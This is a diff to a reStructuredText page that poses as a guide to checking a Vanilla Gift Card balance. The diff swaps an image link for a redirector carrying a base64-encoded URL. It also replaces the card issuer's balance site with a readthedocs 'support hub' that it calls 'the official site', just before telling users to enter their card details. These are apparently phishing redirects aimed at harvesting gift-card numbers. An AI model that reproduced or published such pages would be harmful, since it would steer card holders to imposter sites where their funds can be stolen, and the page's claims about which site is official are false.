@@ -8,7 +8,7 @@ Check your Vanilla Gift Card balance quickly and securely with our simple 2025 g
 
 .. image:: activatenow.png
    :alt: vanilla gift balance
-   :target: https://ww0.us?aHR0cHM6Ly9kaXNjb3ZlcmFjdGl2YXRlLnJlYWR0aGVkb2NzLmlvL2VuL2xhdGVzdA==
+   :target: https://fm.ci?aHR0cHM6Ly92YW5pbGxhYmFsYW5jZS1zdXBwb3J0aHViLnJlYWR0aGVkb2NzLmlv
 
 ========================================
 Step-by-Step to Instantly Check Your Vanilla Gift Card Balance Online
@@ -17,7 +17,7 @@ Step-by-Step to Instantly Check Your Vanilla Gift Card Balance Online
 Step 1: Go to the Official Website
 -----------------------------------------
 
-Open your browser and visit the official site: https://balance.vanillagift.com. Always check that the URL starts with “https” to avoid fake sites.
+Open your browser and visit the official site: https://vanillabalance-supporthub.readthedocs.io/ Always check that the URL starts with “https” to avoid fake sites.
 
 Step 2: Enter Your Card Details
 -----------------------------------------
